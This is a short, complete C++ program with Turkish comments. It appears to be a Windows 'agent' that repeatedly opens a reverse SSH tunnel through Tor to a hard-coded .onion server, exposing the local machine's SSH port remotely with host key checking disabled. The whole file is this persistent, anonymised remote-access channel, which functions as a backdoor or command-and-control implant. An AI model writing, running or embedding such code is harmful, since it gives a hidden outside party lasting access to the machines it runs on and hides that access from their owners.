/* Zihin Koprusu C++ SSH Tunnel Client
 * Uzuv: Windows EXE Ajan (windows_exe_ajan)
 * Merkez: avlihkczlpvz7cd423a3ydmoemkyeviw6xcya4zcxlqa43biaiaftqyd.onion:22
 * Derle: cmake -B build && cmake --build build --config Release
 */
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")

#define SUNUCU_HOST  "avlihkczlpvz7cd423a3ydmoemkyeviw6xcya4zcxlqa43biaiaftqyd.onion"
#define SUNUCU_PORT  22
#define KULLANICI    "zihin"
#define YEREL_PORT   2222
#define SURE_MS      15000

void baglan() {
    char cmd[1024];
    snprintf(cmd, sizeof(cmd),
        "ssh -N -R %d:localhost:22 "
        "-o StrictHostKeyChecking=no "
        "-o ServerAliveInterval=30 "
        "-o \"ProxyCommand=nc -x 127.0.0.1:9050 %%h %%p\" "
        "-p %d "
        "%s@%s",
        YEREL_PORT, SUNUCU_PORT, KULLANICI, SUNUCU_HOST);
    system(cmd);
}

int main() {
    printf("[ZK] C++ istemci basliyor...\n");
    while(1) { baglan(); Sleep(SURE_MS); }
    return 0;
}
